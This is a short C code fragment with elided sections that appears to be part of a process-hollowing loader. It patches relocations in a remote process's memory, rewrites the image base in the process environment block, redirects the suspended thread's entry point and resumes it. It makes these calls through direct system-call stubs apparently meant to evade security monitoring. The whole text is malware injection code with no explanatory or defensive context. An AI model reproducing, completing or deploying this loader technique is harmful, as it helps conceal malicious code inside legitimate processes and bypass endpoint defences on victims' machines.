	...
	*/
	...
	for (i = 0; i < k;) {
		...
		for (j = 0; j < n; ++j) {
			...
			buf = base + relocBlock->PageAddress + relocEntry[j].Offset;

			SET_SYSCALL(numSys[SYS_READ]);
			((NtReadVirtualMemory_t)fun->sys_uni)(hProc, (PVOID)buf, &patch, 8, NULL);

			patch += delta;

			SET_SYSCALL(numSys[SYS_WRITE]);
			((NtWriteVirtualMemory_t)fun->sys_uni)(hProc, (PVOID)buf, &patch, 8, NULL);
		}
	}

	ctx.Rcx = (ULONG_PTR)(base + nt->OptionalHeader.AddressOfEntryPoint);
	SET_SYSCALL(numSys[SYS_WRITE]);
	((NtWriteVirtualMemory_t)fun->sys_uni)(hProc, (PVOID)(ctx.Rdx + 16), &base, 8, NULL);


	SET_SYSCALL(numSys[SYS_SETCTX]);
	((NtSetContextThread_t)fun->sys_uni)(hThread, &ctx);

	SET_SYSCALL(numSys[SYS_RESUME]);
	((NtResumeThread_t)fun->sys_uni)(hThread, NULL);
